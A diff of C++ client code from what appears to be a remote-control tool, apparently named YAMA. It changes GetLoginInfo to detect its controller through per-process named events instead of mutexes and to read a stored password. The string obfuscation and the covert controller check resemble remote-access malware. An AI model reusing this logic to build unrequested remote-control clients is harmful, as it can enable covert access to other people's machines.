@@ -287,8 +287,9 @@ uint64_t CalcalateID(const std::vector<std::string>& clientInfo)
     return XXH64(s.c_str(), s.length(), 0);
 }
 
-LOGIN_INFOR GetLoginInfo(DWORD dwSpeed, CONNECT_ADDRESS& conn)
+LOGIN_INFOR GetLoginInfo(DWORD dwSpeed, CONNECT_ADDRESS& conn, BOOL& isAuthKernel)
 {
+    isAuthKernel = FALSE;
     iniFile cfg(CLIENT_PATH);
     LOGIN_INFOR  LoginInfor;
     LoginInfor.bToken = TOKEN_LOGIN; // 令牌为登录
@@ -332,14 +333,15 @@ LOGIN_INFOR GetLoginInfo(DWORD dwSpeed, CONNECT_ADDRESS& conn)
     LoginInfor.AddReserved(sizeof(void*)==4 ? 32 : 64); // 程序位数
     std::string str;
     std::string masterHash(skCrypt(MASTER_HASH));
-    HANDLE hMutex = OpenMutex(SYNCHRONIZE, FALSE, "MASTER.EXE");
-    hMutex = hMutex ? hMutex : OpenMutex(SYNCHRONIZE, FALSE, "YAMA.EXE");
-#ifndef _DEBUG
-    if (hMutex != NULL) {
-#else
+    std::string pid = std::to_string(GetCurrentProcessId());
+    HANDLE hEvent1 = OpenEventA(SYNCHRONIZE, FALSE, std::string("YAMA_" + pid).c_str());
+    HANDLE hEvent2 = OpenEventA(SYNCHRONIZE, FALSE, std::string("EVENT_" + pid).c_str());
+    if (hEvent1 != NULL || hEvent2 != NULL)
     {
-#endif
-        CloseHandle(hMutex);
+        Mprintf("Check event handle: %d, %d\n", hEvent1 != NULL, hEvent2 != NULL);
+		isAuthKernel = TRUE;
+        CloseHandle(hEvent1);
+		CloseHandle(hEvent2);
         config*cfg = conn.pwdHash == masterHash ? new config : new iniFile;
         str = cfg->GetStr("settings", "Password", "");
         delete cfg;
